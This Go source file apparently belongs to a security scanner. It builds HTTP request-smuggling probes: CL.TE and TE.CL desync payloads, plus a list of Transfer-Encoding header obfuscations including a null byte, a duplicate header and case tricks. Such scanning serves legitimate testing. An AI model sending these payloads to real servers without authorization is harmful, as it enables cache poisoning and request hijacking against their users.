package smuggling

import (
	"fmt"
	"strings"
)

// BuildRawRequest constructs a raw HTTP request string.
func BuildRawRequest(method, host, path string, headers map[string]string, body string) string {
	var sb strings.Builder

	sb.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path))
	sb.WriteString(fmt.Sprintf("Host: %s\r\n", host))

	for k, v := range headers {
		sb.WriteString(fmt.Sprintf("%s: %s\r\n", k, v))
	}

	sb.WriteString("\r\n")

	if body != "" {
		sb.WriteString(body)
	}

	return sb.String()
}

// BuildBaselineRequest creates a simple GET request for baseline measurement.
func BuildBaselineRequest(host, path string) string {
	return BuildRawRequest("GET", host, path, map[string]string{
		"User-Agent":      "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
		"Accept":          "*/*",
		"Connection":      "close",
		"Accept-Encoding": "identity",
	}, "")
}

// BuildCLTEPayload creates a CL.TE smuggling probe payload.
// The payload has a short Content-Length but includes chunked encoding.
// If the frontend uses CL and backend uses TE, the backend will wait for more chunks.
func BuildCLTEPayload(host, path string, delaySeconds int) string {
	// This payload has CL=4 but chunked body that expects more
	// Frontend sees: 4 bytes of body
	// Backend sees: chunked encoding starting with incomplete chunk
	body := "1\r\n" +
		"G\r\n" +
		"0\r\n" +
		"\r\n"

	return "POST " + path + " HTTP/1.1\r\n" +
		"Host: " + host + "\r\n" +
		"User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\n" +
		"Content-Length: 4\r\n" +
		"Transfer-Encoding: chunked\r\n" +
		"\r\n" +
		body
}

// BuildTECLPayload creates a TE.CL smuggling probe payload.
// The payload uses chunked encoding with content that exceeds Content-Length.
// If frontend uses TE and backend uses CL, the backend will wait for more bytes.
func BuildTECLPayload(host, path string, delaySeconds int) string {
	// Frontend sees: chunked body ending at 0\r\n\r\n
	// Backend sees: CL=4, waits for 4 bytes, gets "0\r\n\r" and waits
	return "POST " + path + " HTTP/1.1\r\n" +
		"Host: " + host + "\r\n" +
		"User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\n" +
		"Content-Length: 6\r\n" +
		"Transfer-Encoding: chunked\r\n" +
		"\r\n" +
		"0\r\n" +
		"\r\n" +
		"X"
}

// BuildTETEPayloads creates TE.TE smuggling probe payloads with various obfuscations.
func BuildTETEPayloads(host, path string, delaySeconds int) []string {
	var payloads []string

	baseHeaders := "POST " + path + " HTTP/1.1\r\n" +
		"Host: " + host + "\r\n" +
		"User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\n" +
		"Content-Length: 4\r\n"

	body := "0\r\n" +
		"\r\n"

	// Various TE obfuscation techniques
	teVariants := TEObfuscationVariants()

	for _, te := range teVariants {
		payload := baseHeaders + te + "\r\n\r\n" + body
		payloads = append(payloads, payload)
	}

	return payloads
}

// TEObfuscationVariants returns various Transfer-Encoding header obfuscation variants.
func TEObfuscationVariants() []string {
	return []string{
		"Transfer-Encoding: chunked",
		"Transfer-Encoding : chunked",                        // Space before colon
		"Transfer-Encoding:  chunked",                        // Double space
		"Transfer-Encoding:\tchunked",                        // Tab
		"Transfer-Encoding: chunked ",                        // Trailing space
		"Transfer-Encoding: xchunked",                        // Invalid value
		"Transfer-Encoding: chunked\x00",                     // Null byte
		"Transfer-Encoding: chunked\r\nTransfer-Encoding: x", // Double header
		"Transfer-Encoding: CHUNKED",                         // Uppercase
		"Transfer-Encoding: ChUnKeD",                         // Mixed case
		"transfer-encoding: chunked",                         // Lowercase header
		"Transfer-Encoding: chunked, identity",               // Multiple values
	}
}
